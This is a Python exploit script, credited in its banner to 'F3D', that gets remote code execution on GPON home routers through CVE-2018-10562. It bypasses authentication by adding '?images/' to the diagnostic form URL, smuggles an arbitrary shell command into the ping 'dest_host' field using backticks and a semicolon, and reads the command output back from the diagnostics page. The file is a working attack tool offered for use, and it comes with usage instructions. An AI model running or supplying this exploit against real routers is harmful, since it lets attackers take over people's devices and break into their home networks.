#!/usr/bin/env python

import sys
import requests
import time
import urllib2
import re
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def banner():
	ascii_art = """

	________________________________________________________________

    		[*] GPON Remote Code Execution (CVE-2018-10562) [*]
 	________________________________________________________________

                                 Coded by F3D
                                 Twitter: @f3d_0x0
                                 Medium: medium.com/@0xf3d
 	________________________________________________________________

	"""
	print ascii_art

def retrieve_results(target, command):
	try:
		fp = urllib2.urlopen(target + '/diag.html?images/', context=ctx)
		for line in fp.readlines():
			if 'diag_result = \"Can\'t resolv hostname for' in line:
				start = '['
				end = ';' + command +']'
				res = str(line[line.find(start)+len(start):line.rfind(end)])
				return res.replace('\\n', '\n')
	except Exception as e:
		print "[DEBUG] " + str(e) + '\n'
		print "[*] An error occured while retriving the result"

def send_command(url_bypass, payload):
	print "[*] Injecting command.."
	try:
		req = requests.Request('POST', url_bypass, data=payload)
		prepared = req.prepare()
		s = requests.Session()
		s.send(prepared)
	except Exception as e:
		pass


if __name__ == "__main__":
	try:		
		banner()
		# Getting the parameters
		domain = sys.argv[1]
		command = sys.argv[2]
		# Create url and payload
		url_bypass = domain + '/GponForm/diag_Form?images/'
		payload = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`' + command + '`;' + command + '&ipv=0'
		# Injecting the command
		send_command(url_bypass, payload)
		print "[*] Waiting for results..zZz.."
		time.sleep(3)
		print "[*] Getting the results.."
		# Retrieve the output
		out = retrieve_results(domain, command)
		print ""
		print out
		print ""

	except Exception as e:
		print "[DEBUG] " + str(e) + '\n'
		print "[ERROR] Usage: python gpon_rce.py TARGET_URL COMMAND"
		print "[ERROR] e.g. : python gpon_rce.py http://192.168.1.15 \'id\'\n"			
